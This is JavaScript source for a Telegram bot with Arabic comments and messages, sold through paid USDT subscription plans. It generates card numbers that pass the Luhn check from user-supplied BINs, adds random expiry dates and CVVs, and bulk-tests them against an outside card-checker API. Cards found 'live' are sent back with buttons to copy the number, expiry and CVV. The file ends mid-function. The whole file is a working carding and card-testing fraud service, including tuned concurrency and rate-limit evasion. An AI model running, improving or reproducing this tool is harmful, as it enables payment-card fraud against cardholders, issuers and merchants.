const axios = require('axios');
const TelegramBot = require('node-telegram-bot-api');
const fs = require('fs');
const path = require('path');

const TOKEN = process.env.TOKEN || 'ضع_التوكن_هنا'; // تأكد من وضع التوكن الخاص بك إذا لم تستخدم process.env
if (!TOKEN || TOKEN === 'ضع_التوكن_هنا') {
    console.error('❌ TOKEN is required');
    process.exit(1);
}

const bot = new TelegramBot(TOKEN, { polling: true });

// ==========================================
// دالة التأخير (لتنظيم الطلبات ومنع الحظر)
// ==========================================
const delay = ms => new Promise(resolve => setTimeout(resolve, ms));

// ==========================================
// قاعدة بيانات JSON
// ==========================================
const DATA_FILE = path.join(__dirname, 'data.json');

function loadData() {
    if (!fs.existsSync(DATA_FILE)) return { subscribers: {}, campaigns: {}, pendingPayments: [], paymentProofs: [], plans: null };
    try { return JSON.parse(fs.readFileSync(DATA_FILE, 'utf8')); } catch(e) { return { subscribers: {}, campaigns: {}, pendingPayments: [], paymentProofs: [], plans: null }; }
}

function saveData(data) { fs.writeFileSync(DATA_FILE, JSON.stringify(data, null, 2)); }

function getPlans() {
    const data = loadData();
    if (!data.plans) {
        // تم تحديث الخطط حسب طلبك
        data.plans = {
            free: { nameAr: 'مجاني', nameEn: 'Free', price: 0, cardsLimit: 40, campaignsLimit: 2, speed: 5 },
            plus: { nameAr: 'Plus', nameEn: 'Plus', price: 3, cardsLimit: 500, campaignsLimit: 4, speed: 30 },
            pro: { nameAr: 'Pro', nameEn: 'Pro', price: 5, cardsLimit: 1500, campaignsLimit: 6, speed: 60 },
            vip: { nameAr: 'VIP', nameEn: 'VIP', price: 8, cardsLimit: 3000, campaignsLimit: 10, speed: 100 }
        };
        saveData(data);
    }
    return data.plans;
}

function updatePlans(newPlans) { const d = loadData(); d.plans = newPlans; saveData(d); }

function getSubscriber(userId) {
    const data = loadData();
    if (!data.subscribers[userId]) {
        data.subscribers[userId] = { plan: 'free', startDate: new Date().toISOString(), endDate: new Date(Date.now() + 365*24*60*60*1000).toISOString() };
        saveData(data);
    }
    const sub = data.subscribers[userId];
    if (sub.plan !== 'free' && new Date(sub.endDate) < new Date()) {
        sub.plan = 'free';
        sub.startDate = new Date().toISOString();
        sub.endDate = new Date(Date.now() + 365*24*60*60*1000).toISOString();
        saveData(data);
    }
    return sub;
}

function updateSubscriber(userId, updates) { const d = loadData(); d.subscribers[userId] = { ...d.subscribers[userId], ...updates }; saveData(d); }
function getAllSubscribers() { return loadData().subscribers; }
function getUserActiveCampaigns(userId) { return Object.values(loadData().campaigns).filter(c => c.userId === userId && c.status === 'running'); }
function createCampaign(userId, bin, total) { const d = loadData(); const id = Date.now() + Math.random(); d.campaigns[id] = { id, userId, bin, total, current: 0, hit: 0, status: 'running', createdAt: new Date().toISOString() }; saveData(d); return id; }
function updateCampaign(campaignId, current, hit, status) { const d = loadData(); if (d.campaigns[campaignId]) { if (current !== undefined) d.campaigns[campaignId].current = current; if (hit !== undefined) d.campaigns[campaignId].hit = hit; if (status !== undefined) d.campaigns[campaignId].status = status; saveData(d); } }
function createPendingPayment(userId, plan, code) { const d = loadData(); const p = getPlans()[plan]; d.pendingPayments.push({ id: Date.now() + Math.random(), userId, plan, amount: p.price, code, status: 'waiting_payment', createdAt: new Date().toISOString() }); saveData(d); }
function getPendingPayment(userId, plan) { return loadData().pendingPayments.find(p => p.userId === userId && p.plan === plan && p.status === 'waiting_payment'); }
function updatePendingPayment(id, status) { const d = loadData(); const idx = d.pendingPayments.findIndex(p => p.id === id); if (idx !== -1) d.pendingPayments[idx].status = status; saveData(d); }
function createPaymentProof(userId, plan, photoFileId, messageId) { const d = loadData(); const proof = { id: Date.now() + Math.random(), userId, plan, photoFileId, messageId, status: 'pending', createdAt: new Date().toISOString() }; d.paymentProofs.push(proof); saveData(d); return proof; }
function getPaymentProof(id) { return loadData().paymentProofs.find(p => p.id === id); }
function updatePaymentProof(id, status) { const d = loadData(); const idx = d.paymentProofs.findIndex(p => p.id === id); if (idx !== -1) d.paymentProofs[idx].status = status; saveData(d); }

// ==========================================
// المتغيرات العامة
// ==========================================
const userLang = new Map();
const adminSet = new Set([643309456]); // استبدل هذا بمعرفك الخاص إذا لزم الأمر
const userStates = new Map();          
const activeJobs = new Map();          
const BINANCE_PAY_ID = '842505320';

// ==========================================
// دوال مساعدة
// ==========================================
const countryFlags = { 'united states': '🇺🇸', 'usa': '🇺🇸', 'us': '🇺🇸', 'united kingdom': '🇬🇧', 'uk': '🇬🇧', 'britain': '🇬🇧', 'saudi arabia': '🇸🇦', 'ksa': '🇸🇦', 'saudi': '🇸🇦', 'egypt': '🇪🇬', 'uae': '🇦🇪', 'kuwait': '🇰🇼', 'qatar': '🇶🇦', 'bahrain': '🇧🇭', 'oman': '🇴🇲', 'jordan': '🇯🇴', 'lebanon': '🇱🇧', 'iraq': '🇮🇶', 'syria': '🇸🇾', 'palestine': '🇵🇸', 'turkey': '🇹🇷', 'germany': '🇩🇪', 'france': '🇫🇷', 'italy': '🇮🇹', 'spain': '🇪🇸', 'netherlands': '🇳🇱', 'belgium': '🇧🇪', 'switzerland': '🇨🇭', 'austria': '🇦🇹', 'russia': '🇷🇺', 'china': '🇨🇳', 'japan': '🇯🇵', 'south korea': '🇰🇷', 'india': '🇮🇳', 'brazil': '🇧🇷', 'canada': '🇨🇦', 'mexico': '🇲🇽', 'australia': '🇦🇺', 'indonesia': '🇮🇩', 'malaysia': '🇲🇾', 'singapore': '🇸🇬', 'thailand': '🇹🇭', 'vietnam': '🇻🇳', 'philippines': '🇵🇭', 'pakistan': '🇵🇰', 'bangladesh': '🇧🇩', 'south africa': '🇿🇦', 'nigeria': '🇳🇬', 'morocco': '🇲🇦', 'algeria': '🇩🇿', 'tunisia': '🇹🇳', 'libya': '🇱🇾', 'sudan': '🇸🇩', 'yemen': '🇾🇪' };
function getFlag(cn) { if (!cn) return '🌍'; const l = cn.toLowerCase(); for (const [k, f] of Object.entries(countryFlags)) if (l.includes(k)) return f; return '🌍'; }
function getCardType(cn) { const f=cn[0], t=cn.slice(0,2), fo=cn.slice(0,4); if(f==='4') return 'فيزا كارد'; if(t>='51'&&t<='55') return 'ماستر كارد'; if(t==='34'||t==='37') return 'امريكان اكسبريس'; if(fo==='6011'||t==='65'||(t>='64'&&t<='65')) return 'ديسكفر'; if(t==='35') return 'جيه سي بي'; if(t==='30'||t==='36'||t==='38'||t==='39') return 'دينرز كلوب'; if(t==='50') return 'ميركاتيل'; if(t==='56'||t==='57'||t==='58') return 'مايسترو'; return 'بطاقة ائتمانية'; }
function checkLuhn(card) { let sum=0, alt=false; for(let i=card.length-1;i>=0;i--){ let d=parseInt(card[i],10); if(alt){ d*=2; if(d>9) d-=9; } sum+=d; alt=!alt; } return sum%10===0; }
function randMonth() { return String(Math.floor(Math.random()*12)+1).padStart(2,'0'); }
function randYear() { return String(new Date().getFullYear() + Math.floor(Math.random()*5)); }
function randCVV() { return String(Math.floor(Math.random()*900)+100); }
function genCardNumber(bin, len=16) { let card=bin; while(card.length<len-1) card+=Math.floor(Math.random()*10); for(let i=0;i<=9;i++){ const t=card+i; if(checkLuhn(t)) return t; } return card+'0'; }
function genFullVisa(bin) { return `${genCardNumber(bin)}|${randMonth()}|${randYear()}|${randCVV()}`; }
function genRandomCode() { return Math.random().toString(36).substring(2,10).toUpperCase(); }

// تم تحسين دالة فحص البطاقة لتكون أكثر مرونة ولا توقف الكود عند الخطأ
async function checkSingleCard(cardString, chatId, isSilent=false, retries=2) { 
    try { 
        const r = await axios.post('https://api.chkr.cc/', {data:cardString}, {
            headers:{'User-Agent':'Mozilla/5.0','Content-Type':'application/json'},
            timeout: 15000 // زيادة مهلة الاتصال
        }); 
        const d = r.data; 
        const live = (d.code === 1); 
        if(!live && !isSilent) return null; 
        return { isLive:live, status:d.status||'غير معروف', message:(d.message||'').replace(/احذفها/gi,'').trim(), type:(d.card&&d.card.type)||getCardType(cardString.split('|')[0]), country:(d.card&&d.card.country&&d.card.country.name)||'غير معروف' }; 
    } catch(e) { 
        if(retries > 0) {
            await delay(1000); // الانتظار قبل إعادة المحاولة
            return checkSingleCard(cardString, chatId, isSilent, retries-1); 
        }
        return { isLive: false, error: true }; // إرجاع كائن خطأ آمن لمنع تعطل النظام
    } 
}

function getCopyButtons(fullCard, lang) { const [num,month,year,cvv]=fullCard.split('|'); const d=translations[lang]; return { reply_markup:{ inline_keyboard:[[{text:d.btn_copy_full,callback_data:`copy_full_${fullCard}`}],[{text:d.btn_copy_num,callback_data:`copy_num_${num}`}],[{text:d.btn_copy_exp,callback_data:`copy_exp_${month}|${year}`}],[{text:d.btn_copy_cvv,callback_data:`copy_cvv_${cvv}`}]] } }; }
function formatProgressBar(percent, width=10) { const filled=Math.round(percent/100*width); return '▰'.repeat(filled)+'▱'.repeat(width-filled); }

function buildProgressText(campaignsData, speedPercent) { 
    let txt=`🔄 جاري إنشاء الفيزا وتخمينها\n⚡ السرعة: ${speedPercent}%\n`; 
    for(const d of campaignsData){ 
        const pct=d.total>0?((d.current/d.total)*100):0; 
        const bar=formatProgressBar(pct); 
        const rem=d.total-d.current; 
        txt+=`\n📌 المنفذ (BIN): ${d.bin}\n${bar} ${pct.toFixed(1)}%\n⏳ العد التنازلي: ${rem} بطاقة متبقية\n✅ الصالحة: ${d.hit}\n`; 
    } 
    txt+='\n━━━━━━━━━━━━━━'; 
    return txt; 
}

// ==========================================
// محرك التخمين الاحترافي (مستقر ولا يتوقف)
// ==========================================
async function runMultipleCampaignsParallel(chatId, binsList, totalCardsPerBin) {
    const subscriber = getSubscriber(chatId);
    const planName = subscriber.plan;
    const plans = getPlans();
    const allowedCampaigns = plans[planName].campaignsLimit;
    const speedPercent = plans[planName].speed;
    const lang = userLang.get(chatId) || 'ar';
    const dict = translations[lang];

    if (binsList.length > allowedCampaigns) {
        await bot.sendMessage(chatId, dict.campaigns_limit_reached.replace('{limit}', allowedCampaigns));
        return;
    }

    if (activeJobs.has(chatId)) {
        await bot.sendMessage(chatId, '⚠️ هناك حملات جارية حالياً. استخدم /cancel أو زر الإلغاء أولاً.');
        return;
    }
    
    activeJobs.set(chatId, { cancel: false });

    const campaignsData = binsList.map(bin => ({
        bin,
        cid: createCampaign(chatId, bin, totalCardsPerBin),
        total: totalCardsPerBin,
        current: 0,
        hit: 0
    }));

    let progressMsg;
    try {
        progressMsg = await bot.sendMessage(chatId, buildProgressText(campaignsData, speedPercent), {
            reply_markup: { inline_keyboard: [[{ text: '❌ إلغاء الحملات', callback_data: 'cancel_all_campaigns' }]] }
        });
    } catch (e) {
        console.error("Failed to send initial progress message");
        activeJobs.delete(chatId);
        return;
    }

    let lastEditTime = Date.now();

    // دالة تحديث الرسالة بذكاء (لتجنب حظر تيليجرام 429 Too Many Requests)
    const updateProgressSafe = async (force = false) => {
        if (activeJobs.get(chatId)?.cancel) return;
        const now = Date.now();
        // تحديث كل 3 ثوانٍ فقط، أو إذا كان تحديثاً إجبارياً (النهاية)
        if (force || now - lastEditTime > 3000) {
            const newText = buildProgressText(campaignsData, speedPercent);
            try {
                await bot.editMessageText(newText, { 
                    chat_id: chatId, 
                    message_id: progressMsg.message_id,
                    reply_markup: { inline_keyboard: [[{ text: '❌ إلغاء الحملات', callback_data: 'cancel_all_campaigns' }]] } 
                });
                lastEditTime = Date.now();
            } catch(e) {
                // تجاهل خطأ عدم تغير المحتوى
            }
        }
    };

    // تحديد قوة التخمين (الطلبات المتزامنة) بناءً على السرعة المسموحة
    // سرعة 5% = 1 طلب متزامن وتأخير، سرعة 100% = 5 طلبات متزامنة وبدون تأخير تقريباً
    const batchSize = Math.max(1, Math.ceil((speedPercent / 100) * 5)); 
    const delayBetweenBatches = speedPercent < 20 ? 1500 : (speedPercent < 60 ? 500 : 100);

    const runSingleCampaign = async (camp) => {
        let localHits = 0;
        let generatedCards = [];
        
        // توليد البطاقات بشكل مسبق للحملة
        for (let i = 0; i < camp.total; i++) {
            generatedCards.push(genFullVisa(camp.bin));
        }

        // فحص البطاقات بدفعات صغيرة لتجنب إيقاف السيرفر
        for (let i = 0; i < generatedCards.length; i += batchSize) {
            if (activeJobs.get(chatId)?.cancel) break;

            const batch = generatedCards.slice(i, i + batchSize);
            
            // استخدام allSettled لضمان عدم توقف اللوب إذا فشل طلب واحد
            const results = await Promise.allSettled(batch.map(card => checkSingleCard(card, chatId, true)));

            for (let j = 0; j < results.length; j++) {
                const res = results[j].value; // get value if fulfilled
                if (res && res.isLive) {
                    localHits++;
                    camp.hit++;
                    
                    const flag = getFlag(res.country);
                    const cardType = getCardType(batch[j].split('|')[0]);
                    const liveText = dict.live_result
                        .replace('{card}', batch[j])
                        .replace('{type}', cardType)
                        .replace('{country}', res.country)
                        .replace('{flag}', flag);
                    const buttons = getCopyButtons(batch[j], lang);
                    
                    try {
                        await bot.sendMessage(chatId, liveText, { parse_mode: 'Markdown', ...buttons });
                    } catch (e) {
                        console.error("Error sending live hit");
                    }
                }
            }

            camp.current += batch.length;
            if (camp.current > camp.total) camp.current = camp.total;

            await updateProgressSafe();
            await delay(delayBetweenBatches); // تأخير متعمد حسب السرعة لحماية البوت من الحظر
        }
        
        updateCampaign(camp.cid, camp.current, localHits, activeJobs.get(chatId)?.cancel ? 'stopped' : 'completed');
        return localHits;
    };

    // تشغيل جميع الحملات بالتوازي ولكن كل حملة تعمل بنظام الدفعات الآمنة
    const allHits = await Promise.all(campaignsData.map(c => runSingleCampaign(c)));
    const totalHits = allHits.reduce((a, b) => a + b, 0);

    // إنهاء العمليات
    await updateProgressSafe(true); // تحديث نهائي إجباري
    
    // الانتظار قليلاً قبل حذف الرسالة
    await delay(2000);
    try { await bot.deleteMessage(chatId, progressMsg.message_id); } catch(e) {}
    
    const wasCanceled = activeJobs.get(chatId)?.cancel;
    activeJobs.delete(chatId);
    userStates.delete(chatId);

    if (wasCanceled) {
        await bot.sendMessage(chatId, '🛑 تم إيقاف الحملات بناءً على طلبك.');
    } else {
        if (totalHits === 0) {
            const noLive = dict.no_live_found.replace('{total}', binsList.length * totalCardsPerBin);
            const keyboard = { reply_markup: { inline_keyboard: [[{ text: dict.new_campaign_btn, callback_data: 'menu_guess' }]] } };
            await bot.sendMessage(chatId, noLive, keyboard);
        } else {
            await bot.sendMessage(chatId, dict.summary.replace('{hit}', totalHits).replace('{total}', binsList.length * totalCardsPerBin));
        }
    }
}

// ==========================================
// دوال الاشتراكات والقوائم
// ==========================================
async function handleSubscription(chatId, plan) {
    const lang = userLang.get(chatId) || 'ar';
    const dict = translations[lang];
    const subscriber = getSubscriber(chatId);
    const plans = getPlans();
    if (subscriber.plan === plan) {
        await bot.sendMessage(chatId, dict.already_subscribed.replace('{plan}', plans[plan][`name${lang==='ar'?'Ar':'En'}`]));
        const up = [];
        if (plan === 'plus') up.push({ text: dict.upgrade_to_pro, callback_data: 'sub_pro' });
        if (plan === 'pro') up.push({ text: dict.upgrade_to_vip, callback_data: 'sub_vip' });
        if (up.length) await bot.sendMessage(chatId, dict.upgrade_suggestion, { reply_markup: { inline_keyboard: [up] } });
        return;
    }
    const code = genRandomCode();
    createPendingPayment(chatId, plan, code);
    const text = dict.subscribe_confirm
        .replace('{plan}', plans[plan][`name${lang==='ar'?'Ar':'En'}`])
        .replace('{amount}', plans[plan].price)
        .replace('{payId}', BINANCE_PAY_ID)
        .replace('{code}', code);
    await bot.sendMessage(chatId, text, { parse_mode: 'Markdown' });
}

async function showMainMenu(chatId) {
    const lang = userLang.get(chatId)||'ar', dict=translations[lang];
    const kb = { inline_keyboard: [[{text:dict.btn_guess,callback_data:'menu_guess'}],[{text:dict.btn_single,callback_data:'menu_single'}],[{text:dict.btn_subscribe,callback_data:'menu_subscribe'}],[{text:dict.btn_my_campaigns,callback_data:'menu_my_campaigns'}]] };
    if(adminSet.has(chatId)) kb.inline_keyboard.push([{text:'⚙️ إدارة البوت',callback_data:'admin_panel'}]);
    await bot.sendMessage(chatId, dict.main_menu, { reply_markup: kb, parse_mode: 'Markdown' });
}
async function showSubscriptionMenu(chatId) {
    const lang=userLang.get(chatId)||'ar', dict=translations[lang], plans=getPlans();
    const btns=[]; for(const [k,p] of Object.entries(plans)) if(k!=='free') btns.push([{text:`${p[`name${lang==='ar'?'Ar':'En'}`]} - ${p.price} USDT`,callback_data:`sub_${k}`}]);
    btns.push([{text:dict.cancel_btn,callback_data:'cancel_action'}]);
    await bot.sendMessage(chatId, dict.subscription_plans, { reply_markup: { inline_keyboard: btns } });
}
async function showMyCampaigns(chatId) {
    const lang=userLang.get(chatId)||'ar', dict=translations[lang], camps=getUserActiveCampaigns(chatId);
    if(camps.length===0){ await bot.sendMessage(chatId, dict.no_active_campaigns); return; }
    let txt=dict.active_campaigns; const btns=[];
    for(const c of camps){ txt+=`\n📌 BIN: ${c.bin} | Progress: ${c.current}/${c.total} | Hits: ${c.hit}`; btns.push([{text:`${dict.campaign_stopped.split(' ')[0]} ${c.id}`,callback_data:`stop_camp_${c.id}`}]); }
    btns.push([{text:dict.new_campaign_btn,callback_data:'menu_guess'}]);
    await bot.sendMessage(chatId, txt, { reply_markup: { inline_keyboard: btns } });
}
async function showAdminPanel(chatId) {
    await bot.sendMessage(chatId, '⚙️ لوحة تحكم الأدمن', { reply_markup: { inline_keyboard: [
        [{text:'💰 تعديل الأسعار',callback_data:'admin_edit_prices'}],[{text:'⚡ تعديل السرعة',callback_data:'admin_edit_speed'}],[{text:'➕ إضافة خطة جديدة',callback_data:'admin_add_plan'}],[{text:'🎁 منح اشتراك',callback_data:'admin_grant'}],[{text:'❌ إلغاء اشتراك',callback_data:'admin_remove'}],[{text:'📋 عرض الأعضاء',callback_data:'admin_list'}],[{text:'🔙 رجوع',callback_data:'main_menu'}]
    ] } });
}

// ==========================================
// أوامر البوت
// ==========================================
bot.onText(/\/start/, async (msg) => { 
    const cid=msg.chat.id; 
    userStates.delete(cid);
    await bot.sendMessage(cid, 'اختر لغتك / Choose your language:', { reply_markup:{ inline_keyboard:[[{text:'العربية',callback_data:'lang_ar'},{text:'English',callback_data:'lang_en'}]] } }); 
});

bot.onText(/\/menu/, async (msg) => { 
    userStates.delete(msg.chat.id);
    await showMainMenu(msg.chat.id); 
});

bot.onText(/\/cancel/, async (msg) => { 
    const cid=msg.chat.id; 
    userStates.delete(cid);
    if(activeJobs.has(cid)){ 
        activeJobs.get(cid).cancel=true; 
        await bot.sendMessage(cid, '⏳ جاري إيقاف الحملات بأمان...'); 
    } else {
        await bot.sendMessage(cid, '⚠️ لا توجد حملات نشطة لإلغائها.'); 
    }
});

bot.onText(/\/addadmin (.+)/, async (msg, match) => { const cid=msg.chat.id; if(!adminSet.has(cid)) return; const id=parseInt(match[1]); if(!isNaN(id)) adminSet.add(id); await bot.sendMessage(cid, `✅ تم إضافة أدمن ${id}`); });
bot.onText(/\/removeadmin (.+)/, async (msg, match) => { const cid=msg.chat.id; if(!adminSet.has(cid)) return; const id=parseInt(match[1]); if(id===643309456){ await bot.sendMessage(cid,'⚠️ لا يمكن إزالة الأدمن الأساسي'); return; } adminSet.delete(id); await bot.sendMessage(cid,`✅ تم إزالة أدمن ${id}`); });
bot.onText(/\/admins/, async (msg) => { const cid=msg.chat.id; if(!adminSet.has(cid)) return; await bot.sendMessage(cid, `📋 الأدمن: ${Array.from(adminSet).join(', ')}`); });

// ==========================================
// معالجة الأزرار
// ==========================================
bot.on('callback_query', async (query) => {
    const cid=query.message.chat.id, data=query.data, lang=userLang.get(cid)||'ar', dict=translations[lang];
    
    try { await bot.answerCallbackQuery(query.id); } catch(e) {} // منع تعطل البوت إذا انتهت صلاحية الزر

    if(data.startsWith('copy_full_')){ await bot.sendMessage(cid,`\`${data.replace('copy_full_','')}\``,{parse_mode:'Markdown'}); return; }
    if(data.startsWith('copy_num_')){ await bot.sendMessage(cid,`\`${data.replace('copy_num_','')}\``,{parse_mode:'Markdown'}); return; }
    if(data.startsWith('copy_exp_')){ await bot.sendMessage(cid,`\`${data.replace('copy_exp_','')}\``,{parse_mode:'Markdown'}); return; }
    if(data.startsWith('copy_cvv_')){ await bot.sendMessage(cid,`\`${data.replace('copy_cvv_','')}\``,{parse_mode:'Markdown'}); return; }
    
    if(data==='lang_ar'){ userLang.set(cid,'ar'); await bot.sendMessage(cid,'✅ تم تغيير اللغة إلى العربية'); await showMainMenu(cid); return; }
    if(data==='lang_en'){ userLang.set(cid,'en'); await bot.sendMessage(cid,'✅ Language changed to English'); await showMainMenu(cid); return; }
    
    if(data==='menu_guess'){ 
        if (activeJobs.has(cid)) {
            await bot.sendMessage(cid, '⚠️ لديك حملات جارية، قم بإنهائها أولاً.'); return;
        }
        userStates.set(cid,{step:'awaiting_bin',bins:[],defaultCount:null}); 
        await bot.sendMessage(cid, dict.enter_bin, { parse_mode:'Markdown', reply_markup: { inline_keyboard: [[{text: dict.cancel_btn, callback_data: 'cancel_action'}]] } }); 
        return; 
    }
    
    if(data==='menu_single'){ await bot.sendMessage(cid, dict.single_invalid, { parse_mode:'Markdown' }); return; }
    if(data==='menu_subscribe'){ await showSubscriptionMenu(cid); return; }
    if(data==='menu_my_campaigns'){ await showMyCampaigns(cid); return; }
    
    if(data==='add_another_bin'){ 
        const st=userStates.get(cid); 
        if(st && st.step==='awaiting_decision'){ 
            const sub=getSubscriber(cid), plans=getPlans(), maxC=plans[sub.plan].campaignsLimit; 
            if(st.bins.length>=maxC){ 
                await bot.sendMessage(cid, `⚠️ لقد وصلت إلى الحد الأقصى للحملات المتزامنة (${maxC}). قم بترقية خطتك.`, { reply_markup:{ inline_keyboard:[[{text:'🚀 تطوير اشتراكك',callback_data:'menu_subscribe'}]] } }); return; 
            } 
            st.step='awaiting_bin'; 
            await bot.sendMessage(cid,'📌 أرسل الـ BIN التالي:', { reply_markup: { inline_keyboard: [[{text: dict.cancel_btn, callback_data: 'cancel_action'}]] } }); 
        } 
        return; 
    }
    
    if(data==='set_default_count'){ 
        const st=userStates.get(cid); 
        if(st && st.bins.length>0){ 
            st.step='awaiting_default_count'; 
            await bot.sendMessage(cid,'🔢 أدخل العدد الذي تريد تخمينه لكل حملة (سيتم تطبيقه على جميع BINs):', { reply_markup: { inline_keyboard: [[{text: dict.cancel_btn, callback_data: 'cancel_action'}]] } }); 
        } else await bot.sendMessage(cid,'⚠️ يرجى إدخال BIN أولاً.'); 
        return; 
    }
    
    if(data==='start_with_default' || data==='start_campaigns'){ 
        const st=userStates.get(cid); 
        if(!st || st.bins.length===0){ await bot.sendMessage(cid,'⚠️ لم تقم بإدخال أي BIN بعد.'); return; } 
        if(!st.defaultCount){ await bot.sendMessage(cid,'⚠️ يرجى تعيين العدد الافتراضي أولاً.'); return; } 
        st.step='running'; 
        await runMultipleCampaignsParallel(cid, st.bins, st.defaultCount); 
        return; 
    }
    
    if(data==='cancel_all_campaigns'){ 
        if(activeJobs.has(cid)){ 
            activeJobs.get(cid).cancel=true; 
            await bot.sendMessage(cid,'⏳ جاري الإلغاء بأمان، يرجى الانتظار ثواني...'); 
        } else await bot.sendMessage(cid,'⚠️ لا توجد حملات نشطة.'); 
        return; 
    }
    
    if(data==='cancel_guess' || data==='cancel_action'){ 
        userStates.delete(cid); 
        await bot.sendMessage(cid, dict.cancel_msg);
        await showMainMenu(cid);
        return; 
    }
    
    if(data.startsWith('stop_camp_')){ 
        const campId=parseFloat(data.split('_')[2]); 
        updateCampaign(campId,null,null,'stopped'); 
        await bot.sendMessage(cid, dict.campaign_stopped.replace('{id}',campId)); 
        await showMyCampaigns(cid); 
        return; 
    }
    
    if(data.startsWith('sub_')){ await handleSubscription(cid, data.replace('sub_','')); return; }
    
    if(data==='admin_panel'){ if(!adminSet.has(cid)){ await bot.sendMessage(cid, dict.not_admin); return; } await showAdminPanel(cid); return; }
    if(data==='admin_edit_prices'){ if(!adminSet.has(cid)) return; userStates.set(cid,{step:'admin_edit_price'}); await bot.sendMessage(cid,'أرسل الخطة والسعر الجديد بالصيغة: plan=price\nمثال: plus=4'); return; }
    if(data==='admin_edit_speed'){ if(!adminSet.has(cid)) return; userStates.set(cid,{step:'admin_edit_speed'}); await bot.sendMessage(cid,'أرسل الخطة والسرعة الجديدة بالصيغة: plan=speed\nمثال: pro=80'); return; }
    if(data==='admin_add_plan'){ if(!adminSet.has(cid)) return; userStates.set(cid,{step:'admin_add_plan'}); await bot.sendMessage(cid,'أرسل تفاصيل الخطة: name_ar|name_en|price|cardsLimit|campaignsLimit|speed\nمثال: ماكس|MAX|10|500|10|100'); return; }
    if(data==='admin_grant'){ if(!adminSet.has(cid)) return; userStates.set(cid,{step:'admin_grant'}); await bot.sendMessage(cid,'أرسل: user_id plan\nمثال: 123456789 plus'); return; }
    if(data==='admin_remove'){ if(!adminSet.has(cid)) return; userStates.set(cid,{step:'admin_remove'}); await bot.sendMessage(cid,'أرسل معرف المستخدم'); return; }
    if(data==='admin_list'){ 
        if(!adminSet.has(cid)) return; 
        const subs=getAllSubscribers(); 
        let msg='📋 قائمة الأعضاء:\n'; 
        for(const [id,sub] of Object.entries(subs)) msg+=`🆔 ${id} | خطة: ${sub.plan} | ينتهي: ${new Date(sub.endDate).toLocaleDateString()}\n`; 
        await bot.sendMessage(cid, msg); 
        return; 
    }
    if(data==='main_menu'){ await showMainMenu(cid); return; }
    
    if(data.startsWith('approve_payment_')||data.startsWith('reject_payment_')){ 
        if(!adminSet.has(cid)) return; 
        const parts=data.split('_'), action=parts[0], proofId=parseFloat(parts[2]), proof=getPaymentProof(proofId); 
        if(proof){ 
            const plans=getPlans(); 
            if(action==='approve'){ 
                const end=new Date(); end.setMonth(end.getMonth()+1); 
                updateSubscriber(proof.userId,{plan:proof.plan,startDate:new Date().toISOString(),endDate:end.toISOString()}); 
                updatePaymentProof(proofId,'approved'); 
                const pending=getPendingPayment(proof.userId,proof.plan); 
                if(pending) updatePendingPayment(pending.id,'approved'); 
                const ul=userLang.get(proof.userId)||'ar'; 
                await bot.sendMessage(proof.userId, translations[ul].payment_approved.replace('{plan}',plans[proof.plan][`name${ul==='ar'?'Ar':'En'}`])); 
                await bot.sendMessage(cid,`✅ تم تفعيل الاشتراك للمستخدم ${proof.userId}`); 
            } else { 
                updatePaymentProof(proofId,'rejected'); 
                const ul=userLang.get(proof.userId)||'ar'; 
                await bot.sendMessage(proof.userId, translations[ul].payment_rejected); 
                await bot.sendMessage(cid,`❌ تم رفض الاشتراك للمستخدم ${proof.userId}`); 
            } 
        } 
        return; 
    }
});

// ==========================================
// معالجة الرسائل النصية
// ==========================================
bot.on('message', async (msg) => {
    const cid=msg.chat.id, text=msg.text;
    if(!text && !msg.photo) return;
    if(text && text.startsWith('/')) return;
    
    const lang=userLang.get(cid)||'ar', dict=translations[lang];
    const state=userStates.get(cid);

    // صور الدفع
    if(msg.photo){
        const photo=msg.photo[msg.photo.length-1];
        const fileId=photo.file_id;
        const pendingItem=Object.values(loadData().pendingPayments).find(p=>p.userId===cid && p.status==='waiting_payment');
        if(pendingItem){
            const proof=createPaymentProof(cid, pendingItem.plan, fileId, msg.message_id);
            const caption=`📸 إثبات دفع جديد\nالمستخدم: ${cid}\nالخطة: ${pendingItem.plan}\nالمبلغ: ${pendingItem.amount} USDT\nالكود: ${pendingItem.code}`;
            const adminKeyboard={ reply_markup:{ inline_keyboard:[[{text:'✅ موافقة',callback_data:`approve_payment_${proof.id}`},{text:'❌ رفض',callback_data:`reject_payment_${proof.id}`}]] } };
            for(const adminId of adminSet) await bot.sendPhoto(adminId, fileId, { caption, ...adminKeyboard });
            await bot.sendMessage(cid, dict.payment_received);
            updatePendingPayment(pendingItem.id, 'proof_sent');
        } 
        return;
    }

    if (!text) return; // تأكد أن الرسالة نصية قبل إكمال المعالجة

    // حالة انتظار BIN
    if(state && state.step==='awaiting_bin'){
        if(/^\d+$/.test(text)){
            let bin=text.slice(0,6); while(bin.length<6) bin+=Math.floor(Math.random()*10);
            state.currentBin=bin;
            if(state.defaultCount){
                state.bins.push(bin);
                await bot.sendMessage(cid, `✅ تم إضافة BIN: ${bin} بعدد ${state.defaultCount}\nالحملات الحالية: ${state.bins.length}`);
                const plans=getPlans(), subscriber=getSubscriber(cid), maxC=plans[subscriber.plan].campaignsLimit;
                let btns=[];
                if(state.bins.length>=maxC) btns=[[{text:'🚀 تطوير اشتراكك',callback_data:'menu_subscribe'}],[{text:'🎯 تغيير العدد الافتراضي',callback_data:'set_default_count'}],[{text:'🚀 بدء التخمين',callback_data:'start_with_default'}],[{text:'❌ إلغاء',callback_data:'cancel_guess'}]];
                else btns=[[{text:'➕ إرسال BIN آخر',callback_data:'add_another_bin'}],[{text:'🎯 تغيير العدد الافتراضي',callback_data:'set_default_count'}],[{text:'🚀 بدء التخمين',callback_data:'start_with_default'}],[{text:'❌ إلغاء',callback_data:'cancel_guess'}]];
                await bot.sendMessage(cid, 'ماذا تريد أن تفعل؟', { reply_markup:{ inline_keyboard:btns } });
                state.step='awaiting_decision';
            } else {
                state.step='awaiting_count';
                await bot.sendMessage(cid, `🔢 كم عدد الفيزات التي تريد تخمينها على BIN: ${bin}؟\n(الحد الأدنى 5، الحد الأقصى لخُطتك ${getPlans()[getSubscriber(cid).plan].cardsLimit})`);
            }
        } else {
            await bot.sendMessage(cid, '⚠️ يرجى إرسال أرقام فقط للـ BIN.');
        }
        return;
    }

    // حالة انتظار العدد
    if(state && (state.step==='awaiting_count' || state.step==='awaiting_default_count')){
        const count=parseInt(text);
        if(isNaN(count)){ await bot.sendMessage(cid,'⚠️ يرجى إرسال رقم صحيح.'); return; }
        
        const subscriber=getSubscriber(cid), maxCards=getPlans()[subscriber.plan].cardsLimit;
        
        if(!adminSet.has(cid) && (count<5 || count>maxCards)){
            await bot.sendMessage(cid, dict.count_out_of_range.replace('{max}',maxCards));
            if (subscriber.plan === 'free') {
